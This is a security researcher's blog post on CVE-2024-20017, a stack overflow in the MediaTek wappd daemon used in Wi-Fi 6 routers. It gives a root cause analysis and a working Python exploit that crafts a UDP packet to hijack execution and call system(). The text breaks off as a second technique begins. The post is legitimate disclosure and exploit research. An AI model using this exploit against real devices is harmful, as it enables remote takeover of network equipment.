<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.12/css/all.css" integrity="sha384-G0fIWCsCzJIMAVNQPfjH08cyYaUtMwjJwqiRKxxE/rx96Uroj1BtIQ6MLJuheaO9" crossorigin="anonymous">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="/assets/css/syntax.css" rel="stylesheet" >
  <link href="https://fonts.googleapis.com/css2?family=Cutive+Mono" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Anonymous+Pro:wght@400;700" rel="stylesheet">
  <!-- <link href="https://fonts.googleapis.com/css2?family=Inconsolata" rel="stylesheet"> -->
  <link rel="icon" href="http://0.0.0.0:4000/assets/favicon.ico" >
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>4 exploits, 1 bug: exploiting CVE-2024-20017 4 different ways | hyprblog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="4 exploits, 1 bug: exploiting CVE-2024-20017 4 different ways" />
<meta name="author" content="hyper" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="a post going over 4 exploits for CVE-2024-20017, a remotely exploitable buffer overflow in a component of the MediaTek MT7622 SDK." />
<meta property="og:description" content="a post going over 4 exploits for CVE-2024-20017, a remotely exploitable buffer overflow in a component of the MediaTek MT7622 SDK." />
<link rel="canonical" href="http://0.0.0.0:4000/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html" />
<meta property="og:url" content="http://0.0.0.0:4000/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html" />
<meta property="og:site_name" content="hyprblog" />
<meta property="og:image" content="http://0.0.0.0:4000/assets/images/mtk-wapp-exploit-wax206.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-30T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://0.0.0.0:4000/assets/images/mtk-wapp-exploit-wax206.png" />
<meta property="twitter:title" content="4 exploits, 1 bug: exploiting CVE-2024-20017 4 different ways" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"hyper"},"dateModified":"2024-08-30T00:00:00+00:00","datePublished":"2024-08-30T00:00:00+00:00","description":"a post going over 4 exploits for CVE-2024-20017, a remotely exploitable buffer overflow in a component of the MediaTek MT7622 SDK.","headline":"4 exploits, 1 bug: exploiting CVE-2024-20017 4 different ways","image":"http://0.0.0.0:4000/assets/images/mtk-wapp-exploit-wax206.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html"},"url":"http://0.0.0.0:4000/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="hyprblog" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/"><i class="fas fa-power-off"></i>  hyprblog
    </a><nav class="site-nav">
        <div class="trigger">
          <a class="page-link" href="/trophies.html">trophies</a>
          <a class="page-link" href="/assets/hypr.pub">gpg</a>
          <a class="page-link" href="https://github.com/mellow-hype">github</a>
        </div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
          <!-- <img src="/assets/images/hyperdude.25.jpg"> -->
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <!-- HEADER SECTION -->
  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">4 exploits, 1 bug: exploiting cve-2024-20017 4 different ways</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2024-08-30T00:00:00+00:00" itemprop="datePublished">Aug 30, 2024
      </time></p>
  </header>

  <!-- CONTENT SECTION -->
  <div class="post-content e-content" itemprop="articleBody">
    
    <ul id="toc" class="section-nav">
<li class="toc-entry toc-h2"><a href="#introduction">introduction</a></li>
<li class="toc-entry toc-h2"><a href="#background">background</a></li>
<li class="toc-entry toc-h2"><a href="#exploit-1-rip-hijack-via-corrupted-return-address-rop-to-system">exploit 1: RIP hijack via corrupted return address, ROP to system()</a></li>
<li class="toc-entry toc-h2"><a href="#exploit-2-arbitrary-write-via-pointer-corruption-got-overwrite">exploit 2: arbitrary write via pointer corruption, GOT overwrite</a></li>
<li class="toc-entry toc-h2"><a href="#exploit-3-return-address-corruption--arbitrary-write-via-rop-full-relro">exploit 3: return address corruption + arbitrary write via ROP (full RELRO)</a></li>
<li class="toc-entry toc-h2"><a href="#exploit-4-wax206-return-address-corruption--arbitrary-rw-via-pointer-corruption">exploit 4: WAX206 return address corruption + arbitrary r/w via pointer corruption</a></li>
<li class="toc-entry toc-h2"><a href="#bonus-triggering-a-kernel-bug-by-performing-arbitrary-ioctl-calls-via-jop">bonus: triggering a kernel bug by performing arbitrary IOCTL calls via JOP</a></li>
<li class="toc-entry toc-h2"><a href="#wrapping-up">wrapping up</a></li>
<li class="toc-entry toc-h2"><a href="#references">references</a></li>
</ul>
<h2 id="introduction">
<a class="anchor" href="#introduction" aria-hidden="true"><span class="octicon octicon-link"></span></a>introduction</h2>

<p>Well, here we are. This post was meant to be finished around March of this year to coincide with the
publication of the vulnerability Iâm going to be writing about, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-20017" target="_blank">CVE-2024-20017</a>. Unfortunately, this
also ended up coinciding with me moving, starting a new job, and getting really busy at said job,
so here we are nearly 6 months later. This post is probably going to be one of my longest, so strap
in.</p>

<p>At the end of last year I discovered and reported a vulnerability in <code class="language-plaintext highlighter-rouge">wappd</code>, a network daemon that
is a part of the MediaTek MT7622/MT7915 SDK and RTxxxx SoftAP driver bundle. This chipset is
commonly used on embedded platforms that support Wifi6 (802.11ax) including Ubiquiti, Xiaomi, and
Netgear devices. As is the case for a handful of other bugs Iâve found, I originally came across
this code while looking for bugs on an embedded device: the Netgear WAX206 wireless router. The
<code class="language-plaintext highlighter-rouge">wappd</code> service is primarily used to configure and coordinate the operations of wireless interfaces
and access points using Hotspot 2.0 and related technologies. The structure of the application is a
bit complex but itâs essentially composed of this network service, a set of local services which
interact with the wireless interfaces on the device, and communication channels between the various
components, using Unix domain sockets.</p>

<ul>
  <li>Affected chipsets: MT6890, MT7915, MT7916, MT7981, MT7986, MT7622</li>
  <li>Affected software: SDK version 7.4.0.1 and before (for MT7915) / SDK version 7.6.7.0 and before (for MT7916, MT7981 and MT7986) / OpenWrt 19.07, 21.02</li>
</ul>

<p>The vulnerability is a buffer overflow caused by a copy operation that uses a length value taken
directly from attacker-controlled packet data without bounds checking.  Overall itâs a pretty simple
bug to understand as itâs just a run-of-the-mill stack buffer overflow, so I thought Iâd use this
bug as a case study to explore <em>multiple</em> exploit strategies that can be taken using for this one
bug, applying different exploit mitigations and conditions along the way. I think this is
interesting as it provides an opportunity to focus on the more creative parts of exploit
development: once you know thereâs a bug, and you understand the constraints, coming up with all of
the different ways you can influence the logic of the application and the effects of the bug to get
code execution and pop a shell.</p>

<p>This post will go over 4 exploits for this bug, starting with the simplest version (no stack
canaries, no ASLR, corrupted return address) all the way up to an exploit written for the <code class="language-plaintext highlighter-rouge">wappd</code>
binary shipped on the Netgear WAX206, where multiple mitigations are enabled and we go from x86-64
to arm64. The code for the exploits can be found <a href="https://github.com/mellow-hype/cve-2024-20017" target="_blank">here</a>; its pretty heavily commented to help make
things clearer. It might help to keep those in sight while reading the post so Iâve included links
to the relevant exploit at the start of each section.</p>

<p><em>NOTE: The first 3 exploits discussed below were written for a version of wappd I compiled myself
on an x86_64 machine and with some slight modifications (different sets of mitigations, disabling
forking behavior, compiler optimization).</em></p>

<h2 id="background">
<a class="anchor" href="#background" aria-hidden="true"><span class="octicon octicon-link"></span></a>background</h2>

<h3 id="discovery">discovery</h3>

<p>This bug was discovered through fuzzing with a network-based fuzzer named <a href="https://github.com/denandz/fuzzotron" target="_blank">fuzzotron</a> that I was trying
out for the first time. Check out the Github page for more info but tl;dr it can use <code class="language-plaintext highlighter-rouge">radamsa</code> or
<code class="language-plaintext highlighter-rouge">blab</code> for testcase generation and provides a quick way to fuzz network services with minimal
overhead. In the case of this target, I used <code class="language-plaintext highlighter-rouge">radamsa</code> for mutations and generated a starting corpus
manually using Python to define the structure of the expected packet data and write it to disk. I
also made a minor modification to the <code class="language-plaintext highlighter-rouge">wapp</code> daemon code so that it saved a copy of the last packet
it received to disk as soon as it came in to ensure crashing cases could be saved for triage.</p>

<h3 id="root-cause-analysis">root cause analysis</h3>

<p>The vulnerability occurs due to a lack of bounds checking in <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> prior to using
an attacker-controlled value in a call to <code class="language-plaintext highlighter-rouge">IAPP_MEM_MOVE()</code> (a wrapper around <code class="language-plaintext highlighter-rouge">NdisMoveMemory()</code>)
to copy data into a 167-byte stack-allocated structure.</p>

<p>After reading data from either the UDP or TCP socket in <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerUdp()</code> or <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerTcp()</code>,
respectively, the raw data is cast to <code class="language-plaintext highlighter-rouge">struct IappHdr</code> and the <code class="language-plaintext highlighter-rouge">command</code> field is checked; if this
is command <code class="language-plaintext highlighter-rouge">50</code>, the <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> function will be reached and passed a pointer to the raw
data received from the socket. Inside <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code>, the data is cast to
<code class="language-plaintext highlighter-rouge">struct RT_IAPP_SEND_SECURITY_BLOCK *</code> and assigned to the pointer <code class="language-plaintext highlighter-rouge">pSendSB</code>;  <code class="language-plaintext highlighter-rouge">pSendSB-&gt;Length</code> is
then accessed and used to calculate the length of the data attached to the struct. After copying the
payload data from the cast struct pointer to the <code class="language-plaintext highlighter-rouge">pCmdBuf</code> pointer that is also passed in as an
argument, a call to the macro <code class="language-plaintext highlighter-rouge">IAPP_MEM_MOVE()</code> is made (last line in the snippet below) using the
value of the attacker-controlled <code class="language-plaintext highlighter-rouge">Length</code> field to write from the <code class="language-plaintext highlighter-rouge">pSendSB-&gt;SB</code> buffer field to the
<code class="language-plaintext highlighter-rouge">kdp_info</code> struct declared at the start of the function. Prior to this call, the only bounds check
done on this value is to check that it does not exceed the maximum packet length of 1600 bytes. As
the size of the destination <code class="language-plaintext highlighter-rouge">kdp_info</code> struct is only 167 bytes, this results in a stack buffer
overflow of up to 1433 bytes of attacker-controlled data.</p>

<p>The vulnerable code snippet from <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> is shown below:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">pSendSB</span> <span class="o">=</span> <span class="p">(</span><span class="n">RT_IAPP_SEND_SECURITY_BLOCK</span> <span class="o">*</span><span class="p">)</span> <span class="n">pPktBuf</span><span class="p">;</span>

  <span class="n">BufLen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">OID_REQ</span><span class="p">);</span>
  <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">Length</span> <span class="o">=</span> <span class="n">NTOH_S</span><span class="p">(</span><span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">);</span>
  <span class="n">BufLen</span> <span class="o">+=</span> <span class="n">FT_IP_ADDRESS_SIZE</span> <span class="o">+</span> <span class="n">IAPP_SB_INIT_VEC_SIZE</span> <span class="o">+</span> <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">;</span>

  <span class="n">IAPP_CMD_BUF_ALLOCATE</span><span class="p">(</span><span class="n">pCmdBuf</span><span class="p">,</span> <span class="n">pBufMsg</span><span class="p">,</span> <span class="n">BufLen</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pBufMsg</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="cm">/* End of if */</span>

  <span class="cm">/* command to notify that a Key Req is received */</span>
  <span class="n">DBGPRINT</span><span class="p">(</span><span class="n">RT_DEBUG_TRACE</span><span class="p">,</span> <span class="s">"iapp&gt; IAPP_RcvHandlerSSB</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

  <span class="n">OidReq</span> <span class="o">=</span> <span class="p">(</span><span class="n">POID_REQ</span><span class="p">)</span> <span class="n">pBufMsg</span><span class="p">;</span>
  <span class="n">OidReq</span><span class="o">-&gt;</span><span class="n">OID</span> <span class="o">=</span> <span class="p">(</span><span class="n">RT_SET_FT_KEY_REQ</span> <span class="o">|</span> <span class="n">OID_GET_SET_TOGGLE</span><span class="p">);</span>

  <span class="cm">/* peer IP address */</span>
  <span class="n">IAPP_MEM_MOVE</span><span class="p">(</span><span class="n">OidReq</span><span class="o">-&gt;</span><span class="n">Buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PeerIP</span><span class="p">,</span> <span class="n">FT_IP_ADDRESS_SIZE</span><span class="p">);</span>

  <span class="cm">/* nonce &amp; security block */</span>
  <span class="n">IAPP_MEM_MOVE</span><span class="p">(</span><span class="n">OidReq</span><span class="o">-&gt;</span><span class="n">Buf</span><span class="o">+</span><span class="n">FT_IP_ADDRESS_SIZE</span><span class="p">,</span>
        <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">InitVec</span><span class="p">,</span> <span class="n">IAPP_SB_INIT_VEC_SIZE</span><span class="p">);</span>
  <span class="n">IAPP_MEM_MOVE</span><span class="p">(</span><span class="n">OidReq</span><span class="o">-&gt;</span><span class="n">Buf</span><span class="o">+</span><span class="n">FT_IP_ADDRESS_SIZE</span><span class="o">+</span><span class="n">IAPP_SB_INIT_VEC_SIZE</span><span class="p">,</span>
        <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">SB</span><span class="p">,</span> <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">);</span>
  <span class="c1">// BUG: overflow occurs here</span>
  <span class="n">IAPP_MEM_MOVE</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kdp_info</span><span class="p">,</span> <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">SB</span><span class="p">,</span> <span class="n">pSendSB</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">);</span>
</code></pre></div></div>

<h3 id="code-flow-from-source-to-sink">code flow from source to sink</h3>

<p>The code flow from input to the vulnerable function is:</p>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">IAPP_Start()</code> starts the main processing loop that calls <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code>
</li>
  <li>
<code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> calls <code class="language-plaintext highlighter-rouge">select()</code> to find ready socks and calls the appropriate protocol handler function for each sock that is ready</li>
  <li>Assuming the packet is received over UDP, <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> will call <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerUdp()</code>, passing in a pointer <code class="language-plaintext highlighter-rouge">pPktBuf</code> to be used to store the data received</li>
  <li>
<code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> calls <code class="language-plaintext highlighter-rouge">recvfrom()</code> to read data from the UDP socket and, assuming the data is successfully read, casts the data to <code class="language-plaintext highlighter-rouge">struct IappHdr</code>  and checks the <code class="language-plaintext highlighter-rouge">command</code> field; if the value is <code class="language-plaintext highlighter-rouge">0x50</code>, <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> is called to handle the request</li>
  <li>
<code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> will then use the raw packet data as described above, using the <code class="language-plaintext highlighter-rouge">Length</code> field of the <code class="language-plaintext highlighter-rouge">RT_IAPP_SEND_SECURITY_BLOCK</code> struct embedded in the packet in a call to <code class="language-plaintext highlighter-rouge">IAPP_MEM_MOVE</code> (wrapper for <code class="language-plaintext highlighter-rouge">NdisMoveMemory()</code>), which will write from an offset of the packet data to a stack-allocated struct <code class="language-plaintext highlighter-rouge">kdp_info</code>. This is where the overflow occurs.</li>
</ul>

<h3 id="overview-of-the-injection-point">overview of the injection point</h3>

<p>Before going into the details of exploitation lets take a second to review the injection point where
the corruption occurs, the expected payload format, and the constraints that exist.</p>

<p>The max size that will be read from the UDP socket by the application is 1600 bytes, so this is the
max size of the payload we can send. Accounting for the portions of the payload that must be present
to reach the vulnerable code, this gives us about 1430 bytes we can use to corrupt other data. The
definition of the <code class="language-plaintext highlighter-rouge">RT_IAPP_HEADER</code> and <code class="language-plaintext highlighter-rouge">RT_IAPP_SEND_SECURITY_BLOCK</code> structs are shown below. The
former is embedded into the latter and this represents the format that requests are expected to
arrive in; the application will cast the data read from the socket directly to these types.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* IAPP header in the frame body, 6B */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">PACKED</span> <span class="n">_RT_IAPP_HEADER</span> <span class="p">{</span>
  <span class="n">UCHAR</span> <span class="n">Version</span><span class="p">;</span>  <span class="cm">/* indicates the protocol version of the IAPP */</span>
  <span class="n">UCHAR</span> <span class="n">Command</span><span class="p">;</span>  <span class="cm">/* ADD-notify, MOVE-notify, etc. */</span>
  <span class="n">UINT16</span>  <span class="n">Identifier</span><span class="p">;</span> <span class="cm">/* aids in matching requests and responses */</span>
  <span class="n">UINT16</span>  <span class="n">Length</span><span class="p">;</span>   <span class="cm">/* indicates the length of the entire packet */</span>
<span class="p">}</span> <span class="n">RT_IAPP_HEADER</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">PACKED</span> <span class="n">_RT_IAPP_SEND_SECURITY_BLOCK</span> <span class="p">{</span>
  <span class="n">RT_IAPP_HEADER</span>  <span class="n">IappHeader</span><span class="p">;</span>
  <span class="n">UCHAR</span>     <span class="n">InitVec</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="n">UINT16</span>      <span class="n">Length</span><span class="p">;</span>
  <span class="n">UCHAR</span>     <span class="n">SB</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span> <span class="n">RT_IAPP_SEND_SECURITY_BLOCK</span><span class="p">;</span>
</code></pre></div></div>

<p>The main payload section of the <code class="language-plaintext highlighter-rouge">RT_IAPP_SEND_SECURITY_BLOCK</code> is in the <code class="language-plaintext highlighter-rouge">SB[]</code> field; data is
appended directly to the tail of this struct and the size of this payload is meant to be stored in
the <code class="language-plaintext highlighter-rouge">Length</code> field of the struct. In order to pass other validation checks, the <code class="language-plaintext highlighter-rouge">Length</code> field of
the <code class="language-plaintext highlighter-rouge">IappHeader</code> struct should be kept small; in my payloads I use a size of <code class="language-plaintext highlighter-rouge">0x60</code>. Finally, the
<code class="language-plaintext highlighter-rouge">RT_IAPP_HEADER.Command</code> field must be set to <code class="language-plaintext highlighter-rouge">50</code> in order to reach the vulnerable handler
<code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB</code>.</p>

<p>Other than these basic constraints/requirements, there arenât any other issues to work around like
avoiding null bytes or other restricted values.</p>

<h2 id="exploit-1-rip-hijack-via-corrupted-return-address-rop-to-system">
<a class="anchor" href="#exploit-1-rip-hijack-via-corrupted-return-address-rop-to-system" aria-hidden="true"><span class="octicon octicon-link"></span></a>exploit 1: RIP hijack via corrupted return address, ROP to system()</h2>

<ul>
  <li>Build: non-forking, no optimizations</li>
  <li>Mitigations: NX</li>
</ul>

<p>Weâll first start with the simplest path to achieve code execution, assuming <em>no</em> expoit mitigations
are in place (except non-executable stack). This means addresses are predictable and no leak is
necessary.</p>

<p>This exploit is a classic RIP hijack, using the stack overflow to corrupt the saved return address
and redirect execution. This is about as straightforward as it gets: overflow the stack, align the
overflow to corrupt the saved return address with the desired address to jump to, and wait for the
function to return and use the corrupted value. What you jump to and how you leverage that to get
more control is a blank canvas (for the most part). In the case of this exploit, we keep it simple
by using the corruption to jump to a ROP gadget that will pop a pointer to a string containing a
command to run into the correct registers, and then call <code class="language-plaintext highlighter-rouge">system()</code> to have the command executed.
As ASLR isnât enabled, we assume knowledge of the address of <code class="language-plaintext highlighter-rouge">system()</code> and a stack address close
to where our payload data will be.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">error</span><span class="sh">'</span>

<span class="n">TARGET_IP</span> <span class="o">=</span> <span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span>
<span class="n">TARGET_PORT</span> <span class="o">=</span> <span class="mi">3517</span>
<span class="n">PAD_BYTE</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x22</span><span class="sh">"</span>

<span class="c1"># this is addr on the stack close to where our paylaod data is
</span><span class="n">WRITEABLE_STACK</span> <span class="o">=</span> <span class="mh">0x7fffffff0d70</span>

<span class="c1"># Addresses
</span><span class="n">SYSTEM_ADDR</span>     <span class="o">=</span> <span class="mh">0x7ffff7c50d70</span>
<span class="n">EXIT_ADDR</span>       <span class="o">=</span> <span class="mh">0x7ffff7c455f0</span>
<span class="n">TARGET_RBP_ADDR</span> <span class="o">=</span> <span class="mh">0x5555555555555555</span>  <span class="c1"># doesn't matter
</span><span class="n">GADGET_2</span>        <span class="o">=</span> <span class="mh">0x42bf72</span>  <span class="c1"># pop rdi ; pop rbp ; ret
</span>
<span class="c1"># NOTE: tweak `stack_offset` if env changes and exploit isn't finding command string; +/- 0x10-0x40
# should usually do it.
</span><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">stack_offset</span><span class="o">=</span><span class="mh">0x1b0</span><span class="p">):</span>
    <span class="c1"># iapp header
</span>    <span class="n">header</span> <span class="o">=</span> <span class="nf">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>      <span class="c1"># version
</span>    <span class="n">header</span> <span class="o">+=</span> <span class="nf">p8</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>    <span class="c1"># command
</span>    <span class="n">header</span> <span class="o">+=</span> <span class="nf">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    <span class="c1"># ident
</span>    <span class="n">header</span> <span class="o">+=</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1"># length
</span>
    <span class="c1"># SSB struct frame
</span>    <span class="n">ssb_pkt</span> <span class="o">=</span> <span class="nf">p8</span><span class="p">(</span><span class="mi">55</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>     <span class="c1"># char buf[8], InitVec
</span>    <span class="n">ssb_pkt</span> <span class="o">+=</span> <span class="nf">p16</span><span class="p">(</span><span class="mh">0x150</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="sh">'</span><span class="s">big</span><span class="sh">'</span><span class="p">)</span>  <span class="c1"># u16 Length
</span>
    <span class="c1"># Main payload
</span>    <span class="n">final_pkt</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">ssb_pkt</span>
    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="n">PAD_BYTE</span> <span class="o">*</span> <span class="mi">176</span>
    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">WRITEABLE_STACK</span><span class="p">)</span>
    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="n">PAD_BYTE</span> <span class="o">*</span> <span class="mi">16</span>
    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">WRITEABLE_STACK</span><span class="p">)</span>

    <span class="c1"># RBP OVERWRITE
</span>    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">TARGET_RBP_ADDR</span><span class="p">)</span>

    <span class="c1"># Core Exploit
</span>    <span class="c1"># this will be the first place execution will be redirected; will load the next value into $rdi
</span>    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">GADGET_2</span><span class="p">)</span>
    <span class="c1"># pointer to the command string defined a few lines down
</span>    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">WRITEABLE_STACK</span> <span class="o">-</span> <span class="n">stack_offset</span><span class="p">)</span>
    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="n">PAD_BYTE</span> <span class="o">*</span> <span class="mi">8</span>
    <span class="c1"># address to system to jump to for code exec
</span>    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SYSTEM_ADDR</span><span class="p">)</span>

    <span class="c1"># address to exit() cleanly upon return
</span>    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">EXIT_ADDR</span><span class="p">)</span>
    <span class="c1"># command to run through system()
</span>    <span class="n">final_pkt</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">echo LETSGO!!!</span><span class="se">\x00</span><span class="sh">"</span>
    <span class="k">return</span> <span class="n">final_pkt</span>

<span class="c1"># send payload bytes to target
</span><span class="n">final_pkt</span> <span class="o">=</span> <span class="nf">create</span><span class="p">()</span>
<span class="n">conn</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">TARGET_PORT</span><span class="p">,</span> <span class="n">typ</span><span class="o">=</span><span class="sh">'</span><span class="s">udp</span><span class="sh">'</span><span class="p">)</span>
<span class="n">conn</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">final_pkt</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">info</span><span class="sh">'</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">sent payload to target </span><span class="si">{</span><span class="n">TARGET_IP</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">TARGET_PORT</span><span class="si">}</span><span class="s"> (</span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">final_pkt</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes)</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>On a successful run, the output of the iappd daemon will show a failed call to bash and then print
out the string âLETSGO!!!â, demonstrating the successful execution of <code class="language-plaintext highlighter-rouge">echo</code>, and then exits
cleanly.</p>

<p>(Un)fortunately, these days youâre almost guaranteed to find stack cookies and ASLR in use on
embedded platforms, which will prevent such trivial exploitation. In those cases, youâll need an
info leak to (hopefully) leak the cookie value or youâll just have to move onto other techniques
that donât rely on corrupting the saved return address.</p>

<hr>

<h2 id="exploit-2-arbitrary-write-via-pointer-corruption-got-overwrite">
<a class="anchor" href="#exploit-2-arbitrary-write-via-pointer-corruption-got-overwrite" aria-hidden="true"><span class="octicon octicon-link"></span></a>exploit 2: arbitrary write via pointer corruption, GOT overwrite</h2>

<ul>
  <li>Build: x86_64, non-forking, no optimizations</li>
  <li>Mitigations: ASLR, stack canaries, NX, partial RELRO</li>
  <li><a href="https://github.com/mellow-hype/cve-2024-20017/blob/main/x86_64/x86_64_partial_relro_got.py" target="_blank">Exploit code</a></li>
</ul>

<p>Continuing from where the previous section left off, letâs say at least stack canaries and ASLR are
enabled and the exploit above is no longer viable. Since we donât have an info leak, letâs shift the
focus from corrupting the saved return address on the stack and consider what else could be achieved
with the corruption weâre able to cause <em>before</em> reaching the stack canary.</p>

<p>As you may already know, the locally declared variables for a function are stored in the stack frame
for that function, immediately ahead of the saved return address and base pointer address. The
variables that sit between the end of the overflowed buffer and the start of the previous stack
frame will be corrupted by the overflow. Depending on how those values are used in the code that
executes after weâve corrupted memory, it may be possible to abuse the effects of the corruption to
accomplish gain further control.</p>

<p>Below are the locally declard variables for the vulnerable function <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">RT_IAPP_SEND_SECURITY_BLOCK</span> <span class="o">*</span><span class="n">pSendSB</span><span class="p">;</span>
  <span class="n">UCHAR</span> <span class="o">*</span><span class="n">pBufMsg</span><span class="p">;</span>
  <span class="n">UINT32</span> <span class="n">BufLen</span><span class="p">,</span> <span class="n">if_idx</span><span class="p">;</span>
  <span class="n">POID_REQ</span> <span class="n">OidReq</span><span class="p">;</span>
  <span class="n">FT_KDP_EVT_KEY_ELM</span> <span class="n">kdp_info</span><span class="p">;</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">kdp_info</code> struct is the one that will be overflowed from the effects of the bug, and all of the
variables declared before it can be corrupted. Of particular interest in these situations are
pointers, which could potentially be abused to get a powerful write primitive â if we alter where a
pointer points to, any assignments or writes that the applications performs using that pointer will
result in data being written to an arbitrary address of our choice.</p>

<p>In this case, only a few lines of code remain which make use of the variables after the corruption
is triggered by the call to <code class="language-plaintext highlighter-rouge">IAPP_MEM_MOVE()</code>. These lines are show in the snippet below:</p>

